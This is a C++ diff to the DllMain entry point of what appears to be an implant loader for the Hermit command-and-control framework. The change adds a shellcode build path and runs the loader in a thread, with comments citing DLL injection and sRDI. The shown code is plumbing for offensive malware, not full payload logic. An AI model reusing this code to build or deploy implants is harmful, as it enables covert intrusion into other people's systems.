@@ -2,53 +2,52 @@
 
 #define MAX_THREADS 3
 
-DWORD WINAPI ThreadProc(LPVOID lpParam);
-BOOL g_runFinished = FALSE;
-
-DLLEXPORT VOID Start()
+DWORD WINAPI RunWrapper(LPVOID lpParam)
 {
-    while (TRUE)
-    {
-        Sleep(24*60*60*1000);
-    }
+    Hermit::DLLLoader();
+
+    return 0;
 }
 
-DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
     HANDLE hThread = NULL;
 
     switch (fdwReason)
     {
+        case DLL_QUERY_HMODULE:
+            break;
         case DLL_PROCESS_ATTACH:
+            #ifdef IS_SHELLCODE
+            RunWrapper(nullptr);
+            #else
             // Execute the Run function within a new thread
-            // because WinHTTP functions are not usable in DllMain.
+            // because WinHTTP functions are not usable in DllMain when DLL Injection.
             hThread = CreateThread(
                 NULL,
                 0,
-                ThreadProc,
+                RunWrapper,
                 hinstDLL,
                 0,
                 NULL
             );
+            #endif
+
             break;
+        case DLL_PROCESS_DETACH:
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DETACH:
-            if (lpvReserved != NULL)
-            {
-                break;
-            }
             break;
     }
-
     return TRUE;
 }
 
-DWORD WINAPI ThreadProc(LPVOID lpParam)
-{    
-    Hermit::DLLLoader();
-
-    g_runFinished = TRUE;
-
-    return 0;
+#ifdef IS_SHELLCODE
+// This function is called for sRDI (Shellcode Reflective DLL Injection)
+// But currently this is not used actually...
+DLLEXPORT BOOL Start(LPVOID lpArg, DWORD dwArgLen)
+{
+    // MessageBoxA(NULL, "Start", "Start", MB_OK);
+    return TRUE;
 }
+#endif // IS_SHELLCODE
